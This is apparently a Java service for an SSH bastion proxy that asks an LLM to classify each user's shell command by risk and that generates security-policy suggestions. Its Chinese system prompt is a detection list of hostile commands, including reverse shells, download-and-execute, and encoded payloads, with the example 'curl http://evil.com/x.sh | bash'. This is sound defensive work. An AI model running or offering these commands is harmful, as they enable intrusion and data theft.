package com.zhanghan.sshproxyproject.service;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.zhanghan.sshproxyproject.entity.AiReviewResult;
import com.zhanghan.sshproxyproject.entity.DeepSeekReq;
import com.zhanghan.sshproxyproject.entity.DeepSeekResp;
import com.zhanghan.sshproxyproject.entity.Msg;
import jakarta.annotation.Resource;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.*;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestClientException;
import org.springframework.web.client.RestTemplate;

import java.time.LocalDate;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicLong;

/**
 * AI 调用服务 — 双通道（OpenAI 兼容 /chat/completions 端点）
 * <p>
 * <ul>
 *   <li><b>命令审查</b>：千问 Qwen（qwen.* 配置，低频限流）— {@link #reviewCommand}</li>
 *   <li><b>策略建议</b>：DeepSeek（deepseek.* 配置）— {@link #generateRecommendations}</li>
 * </ul>
 * 调用失败时自动降级放行，不阻塞用户操作。
 */
@Service
@Slf4j
public class DeepSeekService {

    // ==================== 命令审查 AI：千问 Qwen（qwen.*） ====================
    @Value("${qwen.api-key}")
    private String apiKey;

    @Value("${qwen.base-url}")
    private String baseUrl;

    @Value("${qwen.model}")
    private String model;

    @Value("${qwen.daily-token-limit:20000}")
    private long dailyTokenLimit;

    // ==================== 策略建议 AI：DeepSeek（deepseek.*） ====================
    @Value("${deepseek.api-key}")
    private String recommendApiKey;

    @Value("${deepseek.base-url}")
    private String recommendBaseUrl;

    @Value("${deepseek.model}")
    private String recommendModel;

    /** 当日已消耗 token（跨天自动重置），用于每日 AI 额度控制 */
    private volatile String quotaDay = "";
    private final AtomicLong dailyTokensUsed = new AtomicLong(0);

    /** 响应缺失 usage 字段时的保守估算值（单次命令审查） */
    private static final long QUOTA_ESTIMATE_PER_CALL = 1000;

    @Resource
    private RestTemplate restTemplate;

    @Resource
    private ObjectMapper objectMapper;

    // ==================== 系统提示词 ====================

    /**
     * 安全审查专家的角色定义
     * 要求 AI 严格返回 JSON，方便程序解析
     */
    // 注意：本提示词为静态常量，全部请求共享，是上下文缓存的前缀（需 ≥ 缓存最低 token）。
    // 内容修改后 token 数变化，可能影响缓存命中，请保持开头部分的稳定。
    private static final String SYSTEM_PROMPT =
            "你是一个 Linux Shell 命令安全审查专家。你的任务是对用户输入的每一条命令进行风险评估，判断其是否可能对服务器造成数据破坏、权限提升、信息泄露或留下后门。\n" +
            "\n" +
            "## 审查维度\n" +
            "1. 数据破坏：是否会导致数据丢失或系统不可用（rm、dd、mkfs、fdisk 分区、磁盘覆写、清空日志/数据库文件等）\n" +
            "2. 权限提升：是否尝试提权（sudo、su、chmod 777、setuid/setgid、chown root、修改 sudoers 等）\n" +
            "3. 信息泄露：是否将敏感信息外传（curl/wget 上传数据到外部 IP、cat /etc/passwd、/etc/shadow、数据库密码、私钥等）\n" +
            "4. 反弹 Shell：是否建立反向连接（bash -i >& /dev/tcp、nc -e、python/perl/php/ruby socket 反弹、telnet 管道等）\n" +
            "5. 挖矿/滥用：是否下载运行挖矿程序（xmrig、minerd、cpuminer、stratum+tcp 协议、miningpool 等）\n" +
            "6. 后门/持久化：是否创建后门账户、写入 crontab/ssh authorized_keys、修改 rc.local/init.d/systemd 启动项\n" +
            "7. 下载+管道执行：是否从网络下载并直接通过管道执行（curl xxx | bash、wget -O- | sh、下载到 /tmp 后执行）\n" +
            "8. 服务破坏：是否停止/禁用关键安全或业务服务（systemctl stop firewalld/selinux/auditd、kill -9、iptables -F 清空防火墙、docker rm 容器）\n" +
            "\n" +
            "## 混淆与绕过检测（重点，请结合识别）\n" +
            "1. 编码执行：base64 -d <<< <字符串> | bash、echo <hex> | xxd -r -p | sh、printf 十六进制解码\n" +
            "2. 间接执行：eval、bash -c、sh -c、python3 -c、perl -e 中拼接动态命令\n" +
            "3. 命令替换与变量展开：$(curl ...)、${IFS} 替代空格、反斜杠转义字符（rm\\ -rf）、通配符混淆\n" +
            "4. heredoc 写入：cat << EOF > /etc/cron.d/xxx、echo ... >> /etc/rc.local 覆写系统文件\n" +
            "5. 工具滥用：tar 打包 /etc 后管道外传、find -exec 批量执行、gdb/strace 附加进程、tcpdump 抓包、DNS 隧道工具\n" +
            "6. 容器/云攻击：docker run -v /:/host、--privileged、挂载 /var/run/docker.sock、kubectl exec、nsenter/unshare 逃逸\n" +
            "7. 系统破坏：mount --bind 覆盖 /etc /proc、LD_PRELOAD 劫持、chattr +i 锁定、modprobe 加载恶意内核模块\n" +
            "\n" +
            "## 判定标准\n" +
            "- HIGH：不可逆的破坏性操作，或明确的恶意攻击载荷（反弹 Shell、挖矿、删除/格式化、写入后门、提权成功路径）；确认任意一条即判 HIGH\n" +
            "- MEDIUM：有潜在风险、需要结合上下文确认的操作（sudo、用户/密码管理、防火墙与 iptables 修改、容器特权操作、SSH 隧道、下载但不执行）\n" +
            "- LOW：轻微风险或非标准用法但影响可控（单次 curl/wget 下载到临时目录、日志清理、非关键配置查看）\n" +
            "- SAFE：完全正常的运维/查看命令\n" +
            "\n" +
            "## 判定细则\n" +
            "1. 必须区分命令名与参数：rm 单独出现不判 HIGH，rm -rf / 或 rm -rf /etc 判 HIGH；chmod 正常参数安全，chmod 777 系统目录判 MEDIUM\n" +
            "2. 下载命令：curl/wget 仅下载不执行判 MEDIUM；curl xxx | bash 直接管道执行判 HIGH\n" +
            "3. 出现管道、重定向、后台执行（&）、命令替换（$()）时需格外谨慎，常为攻击链组成部分\n" +
            "4. 出现随机变量名、编码字符串、外部 IP:端口、混淆字符时，优先怀疑为攻击载荷\n" +
            "5. 无法确定的命令宁判 MEDIUM 也不要轻易判 SAFE，但不要滥判 HIGH 误伤正常运维\n" +
            "\n" +
            "## 返回格式（必须严格遵守，只返回 JSON，不要有任何其他内容、解释或 markdown 代码块）\n" +
            "{\n" +
            "  \"dangerous\": true/false,\n" +
            "  \"level\": \"HIGH|MEDIUM|LOW|SAFE\",\n" +
            "  \"reason\": \"一句话说明风险原因（中文，具体指出危险点）\",\n" +
            "  \"category\": \"数据破坏|权限提升|信息泄露|反弹Shell|挖矿|后门|下载执行|服务破坏|容器逃逸|正常\"\n" +
            "}\n" +
            "\n" +
            "## 输出示例\n" +
            "示例1 命令：rm -rf /\n" +
            "{\"dangerous\": true, \"level\": \"HIGH\", \"reason\": \"删除根目录，不可逆的破坏性操作\", \"category\": \"数据破坏\"}\n" +
            "示例2 命令：curl http://evil.com/x.sh | bash\n" +
            "{\"dangerous\": true, \"level\": \"HIGH\", \"reason\": \"下载脚本并直接管道执行，典型的恶意载荷落地\", \"category\": \"下载执行\"}\n" +
            "示例3 命令：sudo systemctl restart nginx\n" +
            "{\"dangerous\": false, \"level\": \"LOW\", \"reason\": \"sudo 重启业务服务，正常运维操作\", \"category\": \"正常\"}\n" +
            "示例4 命令：ps aux | grep java\n" +
            "{\"dangerous\": false, \"level\": \"SAFE\", \"reason\": \"查看进程，只读诊断命令\", \"category\": \"正常\"}\n" +
            "\n" +
            "注意：常见的运维命令（ls、cd、cat、less、grep、tail、head、ps、df、free、top、ping、whoami、id、date、echo、exit、systemctl status、docker ps、kubectl get）即使带正常参数也应判定为 SAFE。";

    /**
     * 安全策略建议生成的角色定义
     * 要求 AI 基于审计统计数据，输出 JSON 数组形式的策略建议
     */
    private static final String RECOMMEND_PROMPT =
            "你是一名 Linux 服务器安全策略专家。我会给你一段 SSH 代理堡垒机的审计统计数据，" +
            "请你基于这些数据，生成 3-6 条安全策略改进建议。\n" +
            "\n" +
            "## 输出要求（必须严格遵守，只返回 JSON 数组，不要有任何其他文字或 markdown 代码块）\n" +
            "[\n" +
            "  {\"level\": \"HIGH|MEDIUM|LOW\", \"content\": \"建议内容（中文，一句话，具体可执行）\"}\n" +
            "]\n" +
            "\n" +
            "## 优先级判定标准\n" +
            "- HIGH: 高危命令频繁出现或存在明确恶意行为，需立即处理\n" +
            "- MEDIUM: 存在一定风险隐患，建议近期整改\n" +
            "- LOW: 常规安全加固建议\n" +
            "\n" +
            "建议要具体、可执行，优先针对统计数据中暴露出来的风险点。";

    // ==================== 公开方法 ====================

    /**
     * 调用 DeepSeek API 审查单条命令
     *
     * @param command  用户执行的 shell 命令
     * @param username 执行用户
     * @param role     用户角色 (admin/operator/guest)
     * @return 审查结果，API 异常时返回 fallback（放行）
     */
    public AiReviewResult reviewCommand(String command, String username, String role) {
        if (command == null || command.isBlank()) {
            return AiReviewResult.fallback();
        }

        // 每日额度控制：超限后跳过 AI 审查，降级放行（静态规则仍兜底）
        if (quotaExceeded()) {
            log.warn("今日 AI token 额度已达上限（{}/{}），跳过 AI 审查，降级放行",
                    dailyTokensUsed.get(), dailyTokenLimit);
            return AiReviewResult.fallback();
        }

        // 截断过长命令（token 限制，最长 2000 字符足够覆盖绝大多数场景）
        String truncated = command.length() > 2000 ? command.substring(0, 2000) + "..." : command;

        // 构建请求体
        DeepSeekReq request = buildRequest(truncated, username, role);

        try {
            log.info("调用 AI 审查命令: user={}, role={}, cmd={}",
                    username, role, truncated.substring(0, Math.min(80, truncated.length())));

            DeepSeekResp response = callDeepSeekApi(baseUrl, apiKey, request, true);  // 千问 + 上下文缓存
            recordTokens(response);   // 无论解析成功与否，本次 token 均已消耗
            logCacheInfo(response, truncated);   // 验证上下文缓存是否命中

            if (response == null || response.getFirstContent() == null) {
                log.warn("DeepSeek 返回空内容");
                return AiReviewResult.fallback();
            }

            String content = response.getFirstContent().trim();
            log.info("DeepSeek 原始返回: {}", content);

            // 尝试解析为 AiReviewResult
            AiReviewResult result = parseReviewResult(content);
            log.info("审查结果: dangerous={}, level={}, category={}, reason={}",
                    result.isDangerous(), result.getLevel(),
                    result.getCategory(), result.getReason());
            return result;

        } catch (RestClientException e) {
            log.error("DeepSeek API 网络异常: {}", e.getMessage());
            return AiReviewResult.fallback();
        } catch (Exception e) {
            log.error("DeepSeek 审查异常, cmd={}", truncated, e);
            return AiReviewResult.fallback();
        }
    }

    /**
     * 调用 DeepSeek API 生成安全策略建议
     * <p>
     * 传入审计统计数据（状态分布 + 危险命令排行榜），由 AI 分析后输出建议列表。
     *
     * @param statistics 审计统计数据（可读文本）
     * @return 建议列表 [{level, content}]，API 异常或解析失败时返回 null（由调用方降级）
     */
    public List<Map<String, String>> generateRecommendations(String statistics) {
        if (statistics == null || statistics.isBlank()) {
            return null;
        }

        // 策略建议固定走 DeepSeek（deepseek.* 配置），不占用千问的每日额度
        DeepSeekReq request = new DeepSeekReq();
        request.setModel(recommendModel);
        request.setMessages(List.of(
                new Msg("system", RECOMMEND_PROMPT),
                new Msg("user", "以下是本月的审计统计数据，请据此生成安全策略建议：\n" + statistics)
        ));
        request.setTemperature(0.3);
        request.setMaxTokens(1000);   // 3-6 条建议，1000 token 足够
        request.setStream(false);

        try {
            log.info("调用 DeepSeek 生成策略建议, statsLen={}", statistics.length());
            DeepSeekResp response = callDeepSeekApi(recommendBaseUrl, recommendApiKey, request, false);  // DeepSeek，不开缓存头

            if (response == null || response.getFirstContent() == null) {
                log.warn("DeepSeek 生成建议返回空内容");
                return null;
            }

            String content = response.getFirstContent().trim();
            log.info("DeepSeek 建议原始返回: {}", content);
            return parseRecommendations(content);

        } catch (RestClientException e) {
            log.error("DeepSeek 生成建议网络异常: {}", e.getMessage());
            return null;
        } catch (Exception e) {
            log.error("DeepSeek 生成建议异常", e);
            return null;
        }
    }

    // ==================== 私有方法 ====================

    /**
     * 构建 DeepSeek API 请求
     */
    private DeepSeekReq buildRequest(String command, String username, String role) {
        String userMessage = String.format(
                "用户 %s (角色: %s) 执行了: `%s`",
                username, role, command
        );

        DeepSeekReq req = new DeepSeekReq();
        req.setModel(model);
        req.setMessages(List.of(
                new Msg("system", SYSTEM_PROMPT),
                new Msg("user", userMessage)
        ));
        req.setTemperature(0.1);   // 低温度 → 更确定性的输出
        req.setMaxTokens(256);      // 只需返回 JSON，256 token 足够
        req.setStream(false);
        req.setEnableThinking(false); // Qwen 3.x 默认开思考，本场景只需 JSON，显式关闭
        return req;
    }

    /**
     * 发送 HTTP POST 到 DeepSeek
     */
    private DeepSeekResp callDeepSeekApi(String baseUrl, String apiKey, DeepSeekReq request, boolean contextCache) {
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);
        headers.setBearerAuth(apiKey);
        if (contextCache) {
            // 千问 DashScope 上下文缓存（隐式，前缀 ≥ ~1000 token 才命中）：
            // 显式声明启用，配合静态 SYSTEM_PROMPT 前缀大幅降低重复输入计费
            headers.set("X-Context-Cache", "auto");
        }

        HttpEntity<DeepSeekReq> entity = new HttpEntity<>(request, headers);

        // base-url 需自带 OpenAI 兼容路径（DeepSeek: https://api.deepseek.com 或 .../v1，
        // Qwen DashScope: https://dashscope.aliyuncs.com/compatible-mode/v1），
        // 这里只补 /chat/completions，避免出现 /v1/v1/chat/completions 的重复前缀
        String url = baseUrl + "/chat/completions";

        ResponseEntity<DeepSeekResp> response = restTemplate.exchange(
                url,
                HttpMethod.POST,
                entity,
                DeepSeekResp.class
        );

        return response.getBody();
    }

    /**
     * 每日 AI token 额度是否已用尽（按 LocalDate 跨天自动重置）
     */
    private boolean quotaExceeded() {
        String today = LocalDate.now().toString();
        if (!today.equals(quotaDay)) {
            quotaDay = today;
            dailyTokensUsed.set(0);
        }
        return dailyTokensUsed.get() >= dailyTokenLimit;
    }

    /**
     * 累加本次调用实际"新增处理"的 token：未命中缓存的输入 + 输出。
     * <p>
     * 命中的前缀（SYSTEM_PROMPT）由服务端缓存按折扣计费，不计入每日额度，
     * 这样缓存生效后每条命令只消耗命令本身 + 输出的 token（≈30~60），
     * 与 2w 每日预算配合可支撑数百条命令审查。
     */
    private void recordTokens(DeepSeekResp resp) {
        if (resp == null) {
            return;
        }
        DeepSeekResp.Usage usage = resp.getUsage();
        if (usage == null || usage.getPromptTokens() == null) {
            dailyTokensUsed.addAndGet(QUOTA_ESTIMATE_PER_CALL);
            return;
        }
        long cached = 0;
        if (usage.getPromptTokensDetails() != null
                && usage.getPromptTokensDetails().getCachedTokens() != null) {
            cached = usage.getPromptTokensDetails().getCachedTokens();
        }
        long inputNew = Math.max(0, usage.getPromptTokens() - cached);   // 未命中缓存的输入
        long output = usage.getCompletionTokens() != null
                ? usage.getCompletionTokens() : 0;
        dailyTokensUsed.addAndGet(inputNew + output);
    }

    /**
     * 打印上下文缓存命中情况，用于验证千问隐式缓存是否生效。
     * 若持续出现"未命中缓存"，说明 SYSTEM_PROMPT 前缀仍低于缓存最低 token 门槛。
     */
    private void logCacheInfo(DeepSeekResp resp, String cmd) {
        if (resp == null || resp.getUsage() == null) {
            return;
        }
        DeepSeekResp.Usage u = resp.getUsage();
        Integer cached = u.getPromptTokensDetails() != null
                ? u.getPromptTokensDetails().getCachedTokens() : null;
        if (cached != null && cached > 0) {
            log.info("💾 缓存命中: cached={} token, input={}, cmd='{}', 当日已计={}/{}",
                    cached, u.getPromptTokens(), abbreviate(cmd), dailyTokensUsed.get(), dailyTokenLimit);
        } else {
            log.info("❄️ 未命中缓存(冷启动或前缀不足): input={}, cmd='{}'",
                    u.getPromptTokens(), abbreviate(cmd));
        }
    }

    private static String abbreviate(String cmd) {
        if (cmd == null) return "null";
        return cmd.length() > 80 ? cmd.substring(0, 80) + "..." : cmd;
    }

    /**
     * 解析 AI 返回的 JSON 为 AiReviewResult
     * <p>
     * 做了多道容错：
     * 1. 尝试直接解析 JSON
     * 2. 如果被 markdown ```json...``` 包裹，去掉后重试
     * 3. 仍失败则基于原始文本做关键词兜底判断
     */
    private AiReviewResult parseReviewResult(String raw) {
        // 1. 去掉可能的 markdown 代码块包装
        String json = raw;
        if (json.startsWith("```")) {
            json = json.replaceAll("^```(?:json)?\\s*", "")
                       .replaceAll("\\s*```$", "")
                       .trim();
        }

        // 2. 尝试 JSON 解析
        try {
            return objectMapper.readValue(json, AiReviewResult.class);
        } catch (JsonProcessingException e) {
            log.warn("DeepSeek 返回非标准 JSON，尝试修复: {}", json);
        }

        // 3. 尝试从文本中提取 JSON 子串（处理 "一些文字 { ... } 一些文字" 的情况）
        try {
            int start = json.indexOf('{');
            int end = json.lastIndexOf('}');
            if (start >= 0 && end > start) {
                String extracted = json.substring(start, end + 1);
                return objectMapper.readValue(extracted, AiReviewResult.class);
            }
        } catch (JsonProcessingException e) {
            log.warn("JSON 提取仍然失败");
        }

        // 4. 最终兜底：关键词判断
        return AiReviewResult.rawFallback(raw);
    }

    /**
     * 解析 AI 返回的 JSON 数组为建议列表
     * <p>
     * 做多道容错：
     * 1. 去掉可能的 markdown 代码块包装
     * 2. 尝试直接解析 JSON 数组
     * 3. 从文本中提取 [ ... ] 子串后重试
     * 4. 仍失败返回 null（由调用方降级到默认建议）
     */
    private List<Map<String, String>> parseRecommendations(String raw) {
        String json = raw;
        if (json.startsWith("```")) {
            json = json.replaceAll("^```(?:json)?\\s*", "")
                       .replaceAll("\\s*```$", "")
                       .trim();
        }

        // 1. 直接解析数组
        try {
            return objectMapper.readValue(json, new TypeReference<List<Map<String, String>>>() {});
        } catch (JsonProcessingException e) {
            log.warn("DeepSeek 建议返回非标准 JSON 数组，尝试提取: {}", json);
        }

        // 2. 提取 [ ... ] 子串
        int start = json.indexOf('[');
        int end = json.lastIndexOf(']');
        if (start >= 0 && end > start) {
            try {
                return objectMapper.readValue(json.substring(start, end + 1),
                        new TypeReference<List<Map<String, String>>>() {});
            } catch (JsonProcessingException e) {
                log.warn("提取 AI 建议 JSON 数组仍失败");
            }
        }

        return null;
    }
}
